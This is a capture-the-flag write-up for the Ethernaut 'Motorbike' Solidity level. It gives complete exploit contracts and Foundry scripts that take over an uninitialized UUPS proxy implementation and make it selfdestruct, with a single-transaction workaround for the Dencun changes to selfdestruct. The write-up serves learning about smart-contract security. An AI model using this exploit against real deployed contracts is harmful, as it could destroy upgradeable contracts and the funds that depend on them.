# Ethernaut Level 25 Motorbike

---

This game is **unsolvable** after Dencun update. However, we can still forcefully pass the game by hacking the source code of ethernaut. More info: [here](https://github.com/Ching367436/ethernaut-motorbike-solution-after-decun-upgrade/)

---

Contract:

```solidity
// SPDX-License-Identifier: MIT

pragma solidity <0.7.0;

import "openzeppelin-contracts-06/utils/Address.sol";
import "openzeppelin-contracts-06/proxy/Initializable.sol";

contract Motorbike {
    // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    struct AddressSlot {
        address value;
    }

    // Initializes the upgradeable proxy with an initial implementation specified by `_logic`.
    constructor(address _logic) public {
        require(Address.isContract(_logic), "ERC1967: new implementation is not a contract");
        _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic;
        (bool success,) = _logic.delegatecall(abi.encodeWithSignature("initialize()"));
        require(success, "Call failed");
    }

    // Delegates the current call to `implementation`.
    function _delegate(address implementation) internal virtual {
        // solhint-disable-next-line no-inline-assembly
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }

    // Fallback function that delegates calls to the address returned by `_implementation()`.
    // Will run if no other function in the contract matches the call data
    fallback() external payable virtual {
        _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value);
    }

    // Returns an `AddressSlot` with member `value` located at `slot`.
    function _getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) {
        assembly {
            r_slot := slot
        }
    }
}

contract Engine is Initializable {
    // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    address public upgrader;
    uint256 public horsePower;

    struct AddressSlot {
        address value;
    }

    function initialize() external initializer {
        horsePower = 1000;
        upgrader = msg.sender;
    }

    // Upgrade the implementation of the proxy to `newImplementation`
    // subsequently execute the function call
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable {
        _authorizeUpgrade();
        _upgradeToAndCall(newImplementation, data);
    }

    // Restrict to upgrader role
    function _authorizeUpgrade() internal view {
        require(msg.sender == upgrader, "Can't upgrade");
    }

    // Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.
    function _upgradeToAndCall(address newImplementation, bytes memory data) internal {
        // Initial upgrade and setup call
        _setImplementation(newImplementation);
        if (data.length > 0) {
            (bool success,) = newImplementation.delegatecall(data);
            require(success, "Call failed");
        }
    }

    // Stores a new address in the EIP1967 implementation slot.
    function _setImplementation(address newImplementation) private {
        require(Address.isContract(newImplementation), "ERC1967: new implementation is not a contract");

        AddressSlot storage r;
        assembly {
            r_slot := _IMPLEMENTATION_SLOT
        }
        r.value = newImplementation;
    }
}
```

We have to somehow delete the code of `engine` instance using `selfdestruct()` to pass the game. Notice that `r_slot` in assembly represents the storage slot of `r`. 

## Before Dencun Update

We can see that the implementation contract will be *initialized* in the proxy's constructor. However, it changes the storage state of the proxy (`motorbike`) instead of that of the implementation. If we take a closer look at the implmentation logic, we can see that the implementation itself can call the `initialize()`, which means that whoever calls the `initialize()` directly through implementation instance will become the `upgrader`. After becoming `upgrader`, we will call `upgradeToAndCall(address newImplementation, bytes memory data)` with our malicious new implementation, which has a `selfdestruct()` in it. If the old implementation delegate calls it, it will be self destroyed.

`IEngine.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IEngine {
    function initialize() external;
    function upgradeToAndCall(address newImplementation, bytes calldata data) external payable;
}
```

`BombEngine.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract BombEngine {
    function kill() public {
        selfdestruct(payable(address(0)));
    }
}
```

This is the contract for the new implementation.

`Motorbike.s.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {IEngine} from "../src/IEngine.sol";
import {BombEngine} from "../src/BombEngine.sol";

contract MotorbikeScript is Script {
    address constant MOTORBIKE_ADDRESS = 0xXXXXXXXXXX;
    bytes32 constant IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    address engineAddress = address(uint160(uint256(vm.load(MOTORBIKE_ADDRESS, IMPLEMENTATION_SLOT))));
    IEngine engine = IEngine(engineAddress);
    BombEngine bombEngine;

    function run() external {
        vm.startBroadcast();
        bombEngine = new BombEngine();
        engine.initialize();
        engine.upgradeToAndCall(address(bombEngine), abi.encodeWithSignature("kill()"));
        vm.stopBroadcast();
    }
}
```

Notice that we use `vm.load(MOTORBIKE_ADDRESS, IMPLEMENTATION_SLOT)` to get the implementation address from the deterministic storage slot.

## After Dencun Update

This solution is motivated by [this source](https://github.com/Ching367436/ethernaut-motorbike-solution-after-decun-upgrade/).

The `selfdestruct` function will no longer remove the contract code after the upgrade, so the above solution will not work.

If we take a look at [EIP-6780](https://eips.ethereum.org/EIPS/eip-6780):

> This EIP changes the functionality of the `SELFDESTRUCT` opcode. The new functionality will be only to send all Ether in the account to the target, except that the current behaviour is preserved when `SELFDESTRUCT` is called in the same transaction a contract was created.

So, we can still delete the `Engine` contract code if it is within the same transaction as its creation. So we have to hack the Etherenaut source code, which contains the instance creation part. 

`AddressUtil.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

library AddressUtil {
    function isContract(address _addr) public view returns (bool) {
        // https://ethereum.stackexchange.com/questions/15641/how-does-a-contract-find-out-if-another-address-is-a-contract
        uint32 size;
        assembly {
            size := extcodesize(_addr)
        }
        return (size > 0);
    }
    
    function computeCreateAddress(address deployer, uint256 nonce) public pure returns (address) {
        // forgefmt: disable-start
        // The integer zero is treated as an empty byte string, and as a result it only has a length prefix, 0x80, computed via 0x80 + 0.
        // A one byte integer uses its own value as its length prefix, there is no additional "0x80 + length" prefix that comes before it.
        if (nonce == 0x00)      return addressFromLast20Bytes(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), deployer, bytes1(0x80))));
        if (nonce <= 0x7f)      return addressFromLast20Bytes(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), deployer, uint8(nonce))));

        // Nonces greater than 1 byte all follow a consistent encoding scheme, where each value is preceded by a prefix of 0x80 + length.
        if (nonce <= 2**8 - 1)  return addressFromLast20Bytes(keccak256(abi.encodePacked(bytes1(0xd7), bytes1(0x94), deployer, bytes1(0x81), uint8(nonce))));
        if (nonce <= 2**16 - 1) return addressFromLast20Bytes(keccak256(abi.encodePacked(bytes1(0xd8), bytes1(0x94), deployer, bytes1(0x82), uint16(nonce))));
        if (nonce <= 2**24 - 1) return addressFromLast20Bytes(keccak256(abi.encodePacked(bytes1(0xd9), bytes1(0x94), deployer, bytes1(0x83), uint24(nonce))));
        // forgefmt: disable-end

        // More details about RLP encoding can be found here: https://eth.wiki/fundamentals/rlp
        // 0xda = 0xc0 (short RLP prefix) + 0x16 (length of: 0x94 ++ proxy ++ 0x84 ++ nonce)
        // 0x94 = 0x80 + 0x14 (0x14 = the length of an address, 20 bytes, in hex)
        // 0x84 = 0x80 + 0x04 (0x04 = the bytes length of the nonce, 4 bytes, in hex)
        // We assume nobody can have a nonce large enough to require more than 32 bytes.
        return addressFromLast20Bytes(
            keccak256(abi.encodePacked(bytes1(0xda), bytes1(0x94), deployer, bytes1(0x84), uint32(nonce)))
        );
    }

    function addressFromLast20Bytes(bytes32 bytesValue) private pure returns (address) {
        return address(uint160(uint256(bytesValue)));
    }
}
```

Notice that the instance contract is deployed by the level contract, which means that we can calculate the instance address by using the `level_address` and the `nonce` with the RLP encoding. 

`ExploitContract.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {IEngine} from "../src/IEngine.sol";
import {AddressUtil} from "../src/AddressUtil.sol";

contract Exploit {
    using AddressUtil for address;

    address constant LEVEL_ADDRESS = 0x3A78EE8462BD2e31133de2B8f1f9CBD973D6eDd6;
    address constant ETHERNAUT_ADDRESS = 0xa3e7317E591D5A0F1c605be1b3aC4D2ae56104d6;
    uint256 constant NONCE_GUESS = 6381;
    address constant BOMB_ENGINE_ADDRESS = 0xA0e5F6ae6637230CCfE5d782647B673F23036763; 

    address public engine;
    address public motorbike;

    constructor() {
        solve();
    }

    function solve() public {
        _createLevelInstance();
        engine = LEVEL_ADDRESS.computeCreateAddress(NONCE_GUESS);
        motorbike = LEVEL_ADDRESS.computeCreateAddress(NONCE_GUESS + 1);
        _attack();
        // require(engine.isContract() == false, "Exploit failed");
    }

    function _createLevelInstance() private {
        // create a new Motorbike instance
        (bool success,) = ETHERNAUT_ADDRESS.call(abi.encodeWithSignature("createLevelInstance(address)", LEVEL_ADDRESS));
        require(success, "Failed to create level instance");
    }

    function _attack() private {
        IEngine(engine).initialize();
        IEngine(engine).upgradeToAndCall(BOMB_ENGINE_ADDRESS, "good_hack");
    }

    function submitLevelInstance() public {
        // submit the instance
        (bool success,) = ETHERNAUT_ADDRESS.call(abi.encodeWithSignature("submitLevelInstance(address)", motorbike));
        require(success, "Failed to submit level instance");
    }
}
```

A few things we have to pay attention to in the `exploit` contract: 

1. `NONCE_GUESS` is acquired by using this command:

   ```bash
   cast nonce --rpc-url $YOUR_RPC_URL$ $LEVEL_ADDRESS$
   ```

2. In `BOMB_ENGINE_GUESS`, you can see a minimal bytecode of only a selfdestruct fallback: it is pre-deployed. We have to make sure there is no extra transactions happen in the script.
3. We wrapped `solve()` in the constructor so that we can make sure all the create and attack logic happens within the same single transaction, which is the transaction of deploying exploit contract.

`MotorbikeCreateAndAttack.s.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Exploit} from "../src/ExploitContract.sol";

contract MotorbikeCreateAndAttackScript is Script {
    function run() external {
        vm.startBroadcast();
        Exploit exploit = new Exploit();
        vm.stopBroadcast();
        console.log("Exploit address:", address(exploit));
        console.log("Engine address:", address(exploit.engine()));
        console.log("Motorbike address:", address(exploit.motorbike()));
    }
}
```

We have to first run the script:

```bash
forge script script/MotorbikeCreateAndAttack.s.sol:MotorbikeCreateAndAttackScript --rpc-url $YOUR_RPC_URL --account $YOUR_ACCOUNT$ --broadcast
```

Then call submit manually:

```bash
cast send $EXPLOIT_CONTRACT_ADDRESS$ "submitLevelInstance()" --rpc-url $YOUR_RPC_URL --account $YOUR_ACCOUNT$
```

